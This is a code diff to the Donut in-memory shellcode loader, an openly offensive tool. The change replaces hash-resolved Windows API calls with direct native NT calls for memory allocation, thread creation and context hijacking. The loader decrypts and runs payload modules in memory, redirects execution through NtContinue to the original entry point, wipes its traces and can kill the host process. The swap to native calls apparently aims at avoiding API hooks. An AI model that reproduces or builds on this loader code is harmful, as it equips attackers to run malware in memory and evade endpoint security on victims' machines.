@@ -34,48 +34,30 @@
 DWORD MainProc(PDONUT_INSTANCE inst);
 
 HANDLE DonutLoader(PDONUT_INSTANCE inst) {
-    CreateThread_t     _CreateThread;
-    GetThreadContext_t _GetThreadContext;
     GetCurrentThread_t _GetCurrentThread;
-    NtContinue_t       _NtContinue;
     ULONG64            hash;
     HANDLE             h = NULL;
     CONTEXT            c;
+    NTSTATUS           status;
     
     DPRINT("sizeof(DONUT_INSTANCE)        : %zu\n", sizeof(DONUT_INSTANCE));
     DPRINT("offsetof(DONUT_INSTANCE, api) : %zu\n", offsetof(DONUT_INSTANCE, api));
     
     // create thread and execute original entrypoint?
     if(inst->oep != 0) {
-      DPRINT("Resolving address of CreateThread");
-      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.CreateThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _CreateThread = (CreateThread_t)xGetProcAddress(inst, hash, inst->iv);
-      
-      // api resolved?
-      if(_CreateThread != NULL) {
-        // create new thread
-        DPRINT("Creating new thread");
-        h = _CreateThread(NULL, 0, ADR(LPTHREAD_START_ROUTINE, MainProc), (LPVOID)inst, 0, NULL);
-      } else {
+      status = NtCreateThreadEx(&h, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), ADR(LPTHREAD_START_ROUTINE, MainProc), (PVOID)inst, 0, 0, 0, 0, NULL);
+      if (!NT_SUCCESS(status)) {
         DPRINT("FAILED");
         return (HANDLE)-1;
       }
-      
-      DPRINT("Resolving address of NtContinue");
-      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtContinue) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _NtContinue = (NtContinue_t)xGetProcAddress(inst, hash, inst->iv);
-      
-      DPRINT("Resolving address of GetThreadContext");
-      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetThreadContext) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _GetThreadContext = (GetThreadContext_t)xGetProcAddress(inst, hash, inst->iv);
 
       DPRINT("Resolving address of GetCurrentThread");
       hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetCurrentThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
       _GetCurrentThread = (GetCurrentThread_t)xGetProcAddress(inst, hash, inst->iv);
       
-      if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
+      if(_GetCurrentThread != NULL) {
         c.ContextFlags = CONTEXT_FULL;
-        _GetThreadContext(_GetCurrentThread(), &c);
+        NtGetContextThread(_GetCurrentThread(), &c);
         #ifdef _WIN64
           c.Rip = inst->oep;
           c.Rsp &= -16;
@@ -85,7 +67,7 @@ HANDLE DonutLoader(PDONUT_INSTANCE inst) {
         #endif
         DPRINT("Calling NtContinue");
         //__debugbreak();
-        _NtContinue(&c, FALSE);
+        NtContinue(&c, FALSE);
       }
     } else {
       // execute in existing thread
@@ -99,8 +81,6 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     ULONG64              sig;
     DONUT_ASSEMBLY       assembly;
     PDONUT_MODULE        mod, unpck;
-    VirtualAlloc_t       _VirtualAlloc;
-    VirtualFree_t        _VirtualFree;
     RtlExitUserProcess_t _RtlExitUserProcess;
     LPVOID               pv, ws;
     ULONG64              hash;
@@ -108,37 +88,28 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     NTSTATUS             nts;
     PCHAR                str;
     CHAR                 path[MAX_PATH];
+    NTSTATUS             status;
+    SIZE_T               rs;
     
     DPRINT("Maru IV : %" PRIX64, inst->iv);
-    
-    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualAlloc) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-    DPRINT("Resolving address for VirtualAlloc() : %" PRIX64, hash);
-    _VirtualAlloc = (VirtualAlloc_t)xGetProcAddress(inst, hash, inst->iv);
-    
-    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualFree) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-    DPRINT("Resolving address for VirtualFree() : %" PRIX64, hash);
-    _VirtualFree  = (VirtualFree_t) xGetProcAddress(inst, hash,  inst->iv);
     
     hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.RtlExitUserProcess) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
     DPRINT("Resolving address for RtlExitUserProcess() : %" PRIX64, hash);
     _RtlExitUserProcess  = (RtlExitUserProcess_t) xGetProcAddress(inst, hash,  inst->iv);
     
-    // failed to resolve any?
-    if(_VirtualAlloc       == NULL || 
-       _VirtualFree        == NULL || 
-       _RtlExitUserProcess == NULL) 
+    // failed to resolve?
+    if(_RtlExitUserProcess == NULL)
     {
       DPRINT("FAILED!.");
       return -1;
     }
     
-    DPRINT("VirtualAlloc : %p VirtualFree : %p", 
-      (LPVOID)_VirtualAlloc, (LPVOID)_VirtualFree);
-    
     DPRINT("Allocating %i bytes of RW memory", inst->len);
-    pv = _VirtualAlloc(NULL, inst->len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    
-    if(pv == NULL) {
+    pv = NULL;
+    rs = inst->len;
+    status = NtAllocateVirtualMemory(NtCurrentProcess(), &pv, 0, &rs, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    DPRINT("NTSTATUS: 0x%lx", status);
+    if(!NT_SUCCESS(status)) {
       DPRINT("Memory allocation failed...");
       // terminate host process?
       if(inst->exit_opt == DONUT_OPT_EXIT_PROCESS) {
@@ -265,11 +236,11 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
         mod->len + sizeof(DONUT_MODULE));
       
       // allocate memory for module information + size of decompressed data
-      unpck = (PDONUT_MODULE)_VirtualAlloc(
-        NULL, ((sizeof(DONUT_MODULE) + mod->len) + 4095) & -4096, 
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+      unpck = NULL;
+      rs = ((sizeof(DONUT_MODULE) + mod->len) + 4095) & -4096;
+      status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID)&unpck, 0, &rs, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         
-      if(unpck == NULL) goto erase_memory;
+      if(!NT_SUCCESS(status)) goto erase_memory;
       
       // copy the existing information to new block
       DPRINT("Duplicating DONUT_MODULE");
@@ -338,7 +309,8 @@ erase_memory:
         Memset(inst->module.p, 0, (DWORD)inst->mod_len);
         
         // free memory
-        _VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
+        rs = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID)&inst->module.p, &rs, MEM_RELEASE);
         inst->module.p = NULL;
       }
     }
@@ -350,7 +322,8 @@ erase_memory:
     Memset(inst, 0, inst->len);
     
     DPRINT("Releasing RW memory for instance");
-    _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
+    rs = 0;
+    NtFreeVirtualMemory(NtCurrentProcess(), (PVOID)&inst, &rs, MEM_RELEASE);
     
     if(term) {
       DPRINT("Terminating host process");
@@ -440,7 +413,8 @@ int main(int argc, char *argv[]) {
     }
     fclose(fd);
 
-    system("pause");
+    printf("\nbye!\n");
+    //system("pause");
     return 0;
 }
 #endif
